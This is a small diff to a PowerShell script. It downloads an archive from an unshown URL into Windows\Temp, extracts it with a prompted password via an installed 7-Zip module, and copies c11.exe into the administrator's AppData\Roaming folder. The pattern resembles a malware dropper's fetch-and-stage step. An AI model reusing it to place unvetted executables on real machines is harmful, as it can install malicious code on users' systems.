@@ -6,7 +6,9 @@ $d = "C:\Windows\Temp\c11.zip"
 
 Invoke-WebRequest -Uri $url -OutFile $d
 
-Expand-Archive -Path "C:\Windows\Temp\c11.zip" -DestinationPath "C:\Windows\Temp\c11.exe"
+Install-Module -Name 7Zip4Powershell
+
+Expand-7Zip -ArchiveFileName 'C:\Windows\Temp\c11.zip' -TargetPath 'C:\Windows\Temp\' -SecurePassword (Read-Host "Coloque a senha" -AsSecureString)
 
 copy "C:\Windows\Temp\c11.exe" "C:\Users\administrator\AppData\Roaming\"
 
